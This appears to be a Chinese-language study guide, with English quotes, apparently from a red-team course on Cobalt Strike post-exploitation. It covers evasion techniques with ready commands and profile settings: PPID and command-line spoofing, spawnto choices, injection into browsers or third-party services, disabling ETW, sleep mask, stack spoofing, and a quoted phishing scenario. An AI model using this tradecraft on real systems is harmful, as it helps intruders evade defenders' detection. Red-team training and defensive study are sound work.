# Post-Exploitation Behaviours

Cobalt Strike's post-exploitation命令可以分为四大类

1. House-Keeping.  设置一个配置选项，或者在UI做一些事情，但是不会让Beacon去执行task，如：clear, help & note
2. API Only. 这些命令使用windows API，如：cd, cp, ls, make_token, & ps.
3. Inline Execution. 这些命令以Beacon对象文件（BOF）的形式实现，在Beacon进程本身中执行。如：jump psexec/64/psh 和 remote-exec psexec/wmi
4. Fork and Run. 这些命令产生了一个临时进程，并且注入一个post-exploitation DLL，任何输出都通过一个命名的管道被捕获，如：execute-assembly, powerpick 和 mimikatz


关于哪个命令属于哪个类别的文档：
[Beacon Command Behavior and OPSEC Considerations](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/appendix-a_beacon-opsec-considerations.htm)


# SpawnTo

使用SpawnTo命令默认会在当前进程下产生一个rundll32子进程，这通常是被AV产品严密监视的，极容易被发现

1683447596204.jpg

1683447617015.jpg


改进方法：在spawnto命令后面加上一个二进制文件，如：
```
spawnto x64 %windir%\sysnative\notepad.exe
```

1683447656045.jpg

如果希望在 C2配置文件中设置缺省衍生文件，可以在 post-ex 块中这样做

```
post-ex {
    set spawnto_x86 "%windir%\\syswow64\\notepad.exe";
    set spawnto_x64 "%windir%\\sysnative\\notepad.exe";
}
```


# PPID Spoofing

默认情况下，派生进程是作为调用方的子进程产生的（参考上一节）

PPID Spoofing技术可以指定派生的进程的父进程，比如派生在 explorer.exe 下，原理是使用```CreateProcess ```API 可以指定目标的父ID

假设explorer.exe现在的pid是2704，执行命令：

```
ppid 2704
```

现在运行 shell ping 命令就会在explorer.exe下产生一个进程

1683448502501.jpg

如果要将 PPID 重置回 Beacon 进程，使用不带参数的 PPID 命令

```
beacon> ppid
[*] Tasked beacon to use itself as parent process
```


# Network Connections

在 ```Sysmon``` 监视器中，Beacon 的每次 check-in 都会生成一个新事件

这本身并没有什么神奇的绕过方法--作为操作者，你应该考虑你的主机进程进行网络连接是否有意义。 HTTP信标将进行HTTP/S连接，TCP信标进行TCP连接，SMB信标进行命名的管道连接。(There are no magic bypasses to this per se - as the operator, you should consider whether or not it makes sense for your host process to be making network connections.  An HTTP Beacon will make HTTP/S connections, the TCP Beacon TCP connections and the SMB Beacon named pipe connections.)


# Command Line Spoofing

进程可以用命令行参数启动:

```
C:\>notepad C:\Windows\System32\WindowsCodecsRaw.txt
```

日志工具和流程检查工具可以读取并记录这些参数，因为它们存储在流程本身的流程环境块(Process Environment Block，PEB)中

1683449861256.jpg

多数情况下我们希望隐藏我们真实的参数，可以通过以下4个步骤实现：
1. Create a process with "fake" arguments (these are the arguments you want to get logged) in a suspended state.（在suspended状态下创建一个带有“假”参数的进程）
2. Reach into the PEB and find the RTL_USER_PROCESS_PARAMETERS.（进入PEB，找到 RTL_USER_PROCESS_PARAMETERS）
3. Overwrite the command line arguments in this structure with the actual arguments you want executed.（用你想执行的实际参数覆盖这个结构中的命令行参数）
4. Resume the process.  When the process resumes, it executes the new arguments.（恢复进程。 当进程恢复时，它将执行新的参数）


在Cobalt Strike中使用```argue ```命令实现上面逻辑


首先是一个普通命令：
```
beacon> shell whoami /groups
```

将会被Sysmon 记录为：
```
Process Create:
ProcessId: 5096
Image: C:\Windows\System32\cmd.exe
CommandLine: C:\Windows\system32\cmd.exe /C whoami /groups
```

在CS中使用```argue ```,然后依然执行上面命令

```
beacon> argue C:\Windows\system32\cmd.exe /c ping 127.0.0.1 -n 10
[*] Tasked beacon to spoof 'C:\Windows\system32\cmd.exe' as '/c ping 127.0.0.1 -n 10'

beacon> shell whoami /groups
```

Sysmon 现在记录
```
Process Create:
ProcessId: 2588
Image: C:\Windows\System32\cmd.exe
CommandLine: C:\Windows\system32\cmd.exe /c ping 127.0.0.1 -n 10
```

> 命令行欺骗不是银弹，因为在这种情况下，whoami.exe的进程创建事件仍然被创建。 当运行不产生额外进程的命令时，这种技术要有效得多。(Command Line spoofing is not a silver bullet, as in this case a process creation event for whoami.exe was still created.  The technique is much more effective when running commands that don't spawn additional processes.)


# Session Prepping
1. 是什么？

Session Prepping是一个术语，描述如何为session做"准备",这是拿到initial Beacon或者横向移动后的一个重要步骤

2. 为什么？

使得我们的Beacon更加合理，不容易被发现，更加具有隐秘性

3. 怎么用？

一个思路是，找到 Edge、 IE 或 Chrome 的运行实例，然后向其注入一个 Beacon 有效载荷

如果找不到实例，则生成一个

一旦建立了Beacon ，使用spawnto 命令任何浏览器二进制， 保持PPID设置为Beacon进程

理由：

1. Browsers make outbound HTTP/S connections by design.
2. Edge, IE and Chrome are the most popular (you could include Firefox as well).
3. Browsers legitimately spawn new child processes per tab.

> Send a weaponised Word document in a phishing email that will locate a running instance of Edge, IE or Chrome, then inject a Beacon payload into it.  If an instance is not found, spawn one.  Once the Beacon has landed, set the spawnto to whichever browser binary we landed in (or spawned).  Keep the PPID set to the Beacon process.



对于横向移动：

jump winrm64 会在PowerShell 进程下

jump psexec64 会在rundll32 进程下


rundll32.dll是这里的一个主要例外，因为它在会话ID 0中运行，但没有PPID到一个现有的服务可执行文件。 无论我们使用的是哪种SPA，这都是真实的，因为这只是Cobalt Strike的psexec实现方式的本质。 服务和服务可执行文件在执行后被清理和删除，这使得承载有效载荷的进程处于这种无主状态。 我们不想继续在这个信标中操作，所以我们应该在这个主机上执行任何退出后的操作之前准备好这个会话。（rundll32.dll is a major outlier here because it's running in Session ID 0, but not PPID'd to an existing service executable.  This would be true for whatever spawnto we were using, as this is just the nature of how Cobalt Strike's psexec implementation works.  The service and service executable are cleaned up and removed after execution, which leaves the process hosting the payload in this orphaned state.  We don't want to continue operating in this Beacon, so we should prep the session before performing any post-ex actions on this host.）


根据我们想要实现的目标，我们可以选择两条路径：

1. inject一个用户进程，或者explorer，代价是可能从高完整性的shell降级到中等完整性

```
inject 4628 x64 smb
```

所以接下来，我们需要退出SYSTEM会话，并从cbridges链接到作为amoss运行的会话。 我们可以保留PPID，因为进程是explorer的一个子节点，然后将spawnto设置为用户可能执行的东西。（So next, we need to exit the SYSTEM session and link to the session running as amoss from cbridges.  We can leave the PPID since it's ok for processes to be a child of explorer, and then set the spawnto to something the user might execute.）

2. 如果我们想要在会话0中维护我们的系统级访问。对我来说最有意义的策略是将自己隐藏为现有服务可执行文件的子文件
其中大部分是 Services.exe (the "Services and Controller app")的子服务，绝大多数默认 Windows 服务以 svchost.exe 运行。其中许多还将产生自己的子代，如 SearchApp.exe, taskhostw.exe, ctfmon.exe 等


这些核心 Windows 进程的“问题”在于它们受到保护，因此您不能随意打开它们的句柄，即使当前用户是system

```
beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> inject 840 x64 smb
[-] could not open process 840: 5
[-] could not connect to pipe
```

所以一个可靠的方案是找到第三方服务，因为他们往往会有较低的保护水平。让我们以 Amazon SSM 代理为例来看一看

1683452738726.jpg


amazon-ssm-agent.exe 是 AmazonSSMAgent  服务的服务可执行文件

```
SERVICE_NAME: AmazonSSMAgent
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Amazon SSM Agent
        DEPENDENCIES       :
```

此服务作为子代产生 ssm-agent-worker.exe。这可能是一个很好的选择——我们可以注入到代理进程中，并将衍生程序设置为 worker 可执行文件

```
beacon> inject 2796 x64 smb
[+] established link to child beacon: 10.10.120.75

beacon> spawnto x64 %ProgramFiles%\Amazon\SSM\ssm-agent-worker.exe
```

1683452807672.jpg

综上，具体使用哪些第三方服务要看实际情况，枚举主机服务查看。


# Image Load Events

```execute-assembly```命令，CS会做以下事情

1. Spawn a temporary process (whatever is configured as the spawnto binary).(生成一个临时进程)
2. Load the .NET CLR (Common Language Runtime) into that process.(将.NET CLR加载到该进程中)
3. Execute the given .NET assembly in memory of that process.(在该进程的内存中执行给定的.NET程序集)
4. Get the output and kill the process.(获得输出并杀死该进程。)


避免这种检测方式的一个方法是将 spawnto 设置为 .NET 程序集--Windows 上有很多默认存在的程序集。 找到它们的方法之一是在你自己的机器上运行Sysmon，寻找在正常使用下加载CLR的程序集。 图像加载事件也有助于追踪Mimikatz等功能，因为它可以加载各种处理加密的DLLs，以及与Windows凭证库的交互等。(One way to avoid this style of detection is to set the spawnto to a .NET assembly - there are plenty that exist on Windows by default.  One way to find them is to run Sysmon on your own machine and look for assemblies that are loading the CLR under normal use.  Image load events can also be helpful in tracking down capabilities such as Mimikatz, because it can load various DLLs that handle cryptography, and interactions with the Windows Credential Vault etc.)

# SMB Named Pipes Names

Beacon 主要通过四种方式使用 SMB 命名管道。

1. Retrieve output from fork and run commands such as execute-assembly and powerpick.（检索fork的输出并运行命令，如execute-assembly和powerpick）
2. Connect to Beacon's SSH agent (not something we use in the course).（连接到Beacon的SSH代理）
3. The SMB Beacon's named pipe stager (also not often used).（ SMB Beacon的命名的管道分拣器）
4. C2 comms in the SMB Beacon itself.（ 在SMB Beacon本身的C2通讯）

要改变post-ex命令中使用的管道名称，在post-ex块中使用set pipename指令。 这可以接受一个用逗号分隔的名称列表，并且可以包括#字符以实现一些随机化。
```
post-ex {
        set pipename "totally_not_beacon, legitPipe_##";
}
```

# Event Tracing for Windows (ETW)

关闭事件
```
set COMPlus_ETWEnabled=0
```


# RWX & Cleanup

> 正如我们所知，内存区域有一个保护级别。 在编写我们的进程注入应用程序时，我们很小心，不把内存分配为RWX。 相反，我们选择RW，然后切换到RX。 但是Beacon默认的反射式加载器实际上撤销了这项艰苦的工作。(As we know, memory regions have a protection level.  When writing our process injection applications, we were careful not to allocate memory as RWX.  Instead, we opt for RW and then switch RX.  But Beacon's default reflective loader actually undoes this hard work.)


下面是inject notepad.exe以后的内存区域

1683712532757.jpg

要避免两个问题：

1. We've got a dangling memory region that we don't need anymore.（我们有一个悬空的记忆区域，我们不再需要它了。）

2. Beacon's RWX region is an OPSEC concern that we don't want.（Beacon的RWX区域是一个我们不需要的OPSEC问题。）

解决上面问题，使用profile设置
```
stage {
        set userwx "false";
        set cleanup "true";
}
```

防止使用 RWX 权限，将 userwx 设置为 false

清理与反射加载程序关联的内存区域，将 cleanup 设置为true

# Sleep Mask Kit


> Cobalt Strike有几个功能，允许操作者改变信标有效载荷在内存中的显示方式。 这些功能在躲避内存扫描器等防御措施时很有帮助。Sleep Mask Kit就是这样一种能力，它将是本节的重点。（Cobalt Strike has several capabilities which allow operators to change how the Beacon payload appears in memory.  These are helpful when evading defences such as memory scanners.  One such capability is the Sleep Mask Kit and will be the focus of this section.）


> Malleable C2有一组可以添加到stage 的变换。 其中之一是strrep，是字符串替换的简称。(Malleable C2 has a set of transforms that can be added to the stage block.  One of those is strrep, short for string replacement.)

```
stage {
        set userwx "false";
        set cleanup "true";

        transform-x64 {
                strrep "beacon.x64.dll" "data.dll";
                strrep "ReflectiveLoader" "LoadData";
        }
}
```


> 要启用Sleep Mask，请将sleep_mask指令添加到C2配置文件中，生成新的shellcode并注入它。(To enable the Sleep Mask, add the sleep_mask directive into C2 profile, generate new shellcode and inject it.)

```
stage {
        set userwx "false";
        set cleanup "true";
        set sleep_mask "true";

        transform-x64 {
                strrep "beacon.x64.dll" "not-beacon.dll";
                strrep "ReflectiveLoader" "LoadData";
        }
}
```

如果你把Beacon的睡眠时间设置为0，并再次运行YARA规则，你会发现要么什么都没检测到，要么检测到之前的字符串的情况。(If you set Beacon's sleep time to 0 and run the YARA rules again, you will find instances where either nothing is detected or the previous strings are detected.)


这取决于你是否在Beacon睡着的时候抓住它。 这就是为什么strrep等看似低级的技术与sleep_mask配合使用，以及为什么低睡眠时间也能破坏你的OPSEC。(This depends on whether you catch Beacon whilst it's asleep or not.  This is why seemingly inferior techniques such as strrep are useful in conjunction with sleep_mask and why low sleep times can also destroy your OPSEC.)


sleepmask源代码包含三个文件：sleepmask.c, sleepmask_smb.c and sleepmask_tcp.c

```
ubuntu@teamserver ~/c/a/k/sleepmask> pwd
/home/ubuntu/cobaltstrike/arsenal-kit/kits/sleepmask
ubuntu@teamserver ~/c/a/k/sleepmask> ll -R
.:
total 16K
-rw-r--r-- 1 ubuntu ubuntu 3.1K Apr 26 20:37 README.md
-rwxr--r-- 1 ubuntu ubuntu 2.4K Apr 26 20:37 build.sh*
-rw-r--r-- 1 ubuntu ubuntu  896 Apr 26 20:37 script_template.cna
drwxrwxr-x 2 ubuntu ubuntu 4.0K Apr 26 20:37 src/

./src:
total 12K
-rw-r--r-- 1 ubuntu ubuntu 2.1K Apr 26 20:37 sleepmask.c
-rw-r--r-- 1 ubuntu ubuntu 3.0K Apr 26 20:37 sleepmask_smb.c
-rw-r--r-- 1 ubuntu ubuntu 2.5K Apr 26 20:37 sleepmask_tcp.c
```

要构建工具包，请运行 build.sh. 并指定一个输出目录。

```
ubuntu@teamserver ~/c/a/k/sleepmask> sudo ./build.sh /tmp/sleepmask
[Sleepmask kit] [+] You have a x86_64 mingw--I will recompile the sleepmask beacon object files
[Sleepmask kit] [*] Compile sleepmask.x86.o
[Sleepmask kit] [*] Compile sleepmask_tcp.x86.o
[Sleepmask kit] [*] Compile sleepmask_smb.x86.o
[Sleepmask kit] [*] Compile sleepmask.x64.o
[Sleepmask kit] [*] Compile sleepmask_tcp.x64.o
[Sleepmask kit] [*] Compile sleepmask_smb.x64.o
[Sleepmask kit] [+] The sleepmask beacon object files are saved in '/tmp/sleepmask'
ubuntu@teamserver ~/c/a/k/sleepmask> ll /tmp/sleepmask
total 28K
-rw-r--r-- 1 root root 1.1K May 30 09:38 sleepmask.cna
-rw-r--r-- 1 root root  891 May 30 09:38 sleepmask.x64.o
-rw-r--r-- 1 root root  634 May 30 09:38 sleepmask.x86.o
-rw-r--r-- 1 root root 1.1K May 30 09:38 sleepmask_smb.x64.o
-rw-r--r-- 1 root root  846 May 30 09:38 sleepmask_smb.x86.o
-rw-r--r-- 1 root root 1007 May 30 09:38 sleepmask_tcp.x64.o
-rw-r--r-- 1 root root  798 May 30 09:38 sleepmask_tcp.x86.o
```

输出将包括每个sleepmask变体的x64和x86构建，以及一个攻击者脚本。 将该文件夹复制到Windows攻击者虚拟机上。

```
C:\Users\Administrator\Desktop>pscp -r -i ssh.ppk ubuntu@10.10.0.69:/tmp/sleepmask C:\Tools\cobaltstrike
sleepmask_tcp.x64.o       | 0 kB |   1.0 kB/s | ETA: 00:00:00 | 100%
sleepmask_smb.x86.o       | 0 kB |   0.8 kB/s | ETA: 00:00:00 | 100%
sleepmask.x64.o           | 0 kB |   0.9 kB/s | ETA: 00:00:00 | 100%
sleepmask.x86.o           | 0 kB |   0.6 kB/s | ETA: 00:00:00 | 100%
sleepmask.cna             | 1 kB |   1.1 kB/s | ETA: 00:00:00 | 100%
sleepmask_smb.x64.o       | 1 kB |   1.0 kB/s | ETA: 00:00:00 | 100%
sleepmask_tcp.x86.o       | 0 kB |   0.8 kB/s | ETA: 00:00:00 | 100%
```

去到Cobalt Strike -> Script Manager 点击Load and select sleepmask.cna

 为了测试，生成并执行一个新的payload。
 
 
 # Thread Stack Spoofing

Thread Stack 又称Stack Spoofing，是另一种内存规避技术，其目的是在调用堆栈中隐藏对shellcode的引用


> 堆栈欺骗可以通过Artifact Kit设置 "stack spoof "为true来启用。(Stack spoofing can be enabled via the Artifact Kit by setting the "stack spoof" option to true.)

1683728925647.jpg

如何用？

编译
```
./build.sh pipe VirtualAlloc 271360 5 true true /tmp/dist
```

在/tmp/dist目录下会生成artifacts套件，复制到windows上的cs下，load CNA,然后生成payload

> Copy the artifacts across to the Windows machine, load the CNA script and generate a new payload. 


```arsenal-kit/kits/artifact/src-common/spoof.c```里的这行代码防止堆栈遍历（stack walking）


1683729548824.jpg